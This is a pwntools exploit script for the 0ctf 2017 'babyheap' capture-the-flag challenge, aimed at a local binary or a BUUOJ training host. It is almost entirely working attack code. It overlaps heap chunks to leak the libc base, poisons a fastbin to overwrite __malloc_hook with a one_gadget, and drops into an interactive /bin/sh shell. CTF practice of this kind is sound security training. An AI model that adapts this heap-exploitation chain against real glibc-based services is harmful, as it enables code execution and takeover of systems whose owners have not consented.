from pwn import *

#context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6')

debug = 1

if debug:
    io = process('./0ctf_2017_babyheap')
else:
    io = remote('node4.buuoj.cn',28880)

def p():
    gdb.attach(proc.pidof(io)[0])

one_gadget= [0x45206, 0x4525a ,0xef9f4 ,0xf0897 ]
#one_gadget[1] = 0x4526a
'''
0x45206 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4525a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xef9f4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf0897 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

def new(size):
    io.sendlineafter(b"Command: ",str(1))
    io.sendlineafter(b"Size: ",str(size))

def fill(idx,size,content):
    io.sendlineafter(b"Command: ",str(2))
    io.sendlineafter(b"Index: ",str(idx))
    io.sendlineafter(b"Size: ",str(size))
    io.sendafter(b"Content: ",content)

def delete(idx):
    io.sendlineafter(b"Command: ",str(3))
    io.sendlineafter(b"Index: ",str(idx))

def show(idx):
    io.sendlineafter(b"Command: ",str(4))
    io.sendlineafter(b"Index: ",str(idx))

#泄漏libc
new(8) #0
new(8) #1
new(8) #2
new(8) #3
new(128) #4
delete(1)
delete(2)
over_write = p64(0)*3 + p64(0x21) + p64(0) * 3 + p64(0x21) + b'\x80'
fill(0,65,over_write)
over_write = p64(0) * 3 + b'\x21'
fill(3,25,over_write)   #修改size从0x91改成0x21
new(8) #1 chunk2
new(8) #2 和chunk4的地址相同
over_write = p64(0) * 3 + b'\x91'
fill(3,25,over_write)   #修改size从0x91改成0x21
new(8) #chunk5 防止chunk4与topchunk合并
delete(4)
show(2)
io.recvuntil(b"Content: \n")
libc_base = u64(io.recv(6).ljust(8,b'\x00')) - 0x3c3b78
#libc_base = u64(io.recv(6).ljust(8,b'\x00')) - 0x3c4b78
success("libc_base --->" + hex(libc_base))

new(96) # chunk4
delete(4)
malloc_hook = libc.symbols['__malloc_hook'] + libc_base
fill(2,8,p64(malloc_hook -0x30+0xd))
#fill(2,8,p64(libc_base + 0x3c4aed))
new(96)
new(96) # chunk6
payload = b'\x00'* 0x13 + p64(one_gadget[1]+libc_base)
size = len(payload)
pause()
fill(6,size,payload)
new(8)

io.interactive()

